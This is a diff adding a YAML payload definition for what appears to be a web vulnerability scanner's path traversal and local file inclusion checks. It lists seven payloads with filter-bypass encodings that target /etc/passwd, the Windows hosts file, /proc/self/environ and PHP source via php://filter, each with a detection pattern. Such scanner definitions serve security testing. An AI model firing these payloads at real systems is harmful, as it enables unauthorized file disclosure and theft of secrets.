@@ -1,0 +1,54 @@
+id: lfi-traversal
+name: Path traversal / local file inclusion
+context:
+  any: true
+
+payloads:
+  - value: "../../../../etc/passwd"
+    detect: { body_regex: "root:.*:0:0" }
+    id: lfi-passwd-01
+    title: "LFI — /etc/passwd via path traversal"
+    severity: critical
+    cwe: CWE-22
+
+  - value: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    detect: { body_contains: "localhost" }
+    id: lfi-win-hosts-01
+    title: "LFI — Windows hosts file via backslash traversal"
+    severity: critical
+    cwe: CWE-22
+
+  - value: "....//....//....//etc/passwd"
+    detect: { body_regex: "root:.*:0:0" }
+    id: lfi-double-01
+    title: "LFI — double-dot filter bypass"
+    severity: critical
+    cwe: CWE-22
+
+  - value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    detect: { body_regex: "root:.*:0:0" }
+    id: lfi-urlencode-01
+    title: "LFI — URL-encoded traversal bypass"
+    severity: critical
+    cwe: CWE-22
+
+  - value: "..%252f..%252f..%252fetc/passwd"
+    detect: { body_regex: "root:.*:0:0" }
+    id: lfi-double-encode-01
+    title: "LFI — double URL-encoding bypass"
+    severity: critical
+    cwe: CWE-22
+
+  - value: "php://filter/convert.base64-encode/resource=index.php"
+    detect: { body_regex: "[A-Za-z0-9+/=]{50,}" }
+    id: lfi-php-filter-01
+    title: "LFI — PHP wrapper (source code disclosure)"
+    severity: critical
+    cwe: CWE-22
+
+  - value: "/proc/self/environ"
+    detect: { body_regex: "PATH=|HOME=|USER=" }
+    id: lfi-proc-01
+    title: "LFI — /proc/self/environ (environment variable leak)"
+    severity: critical
+    cwe: CWE-22
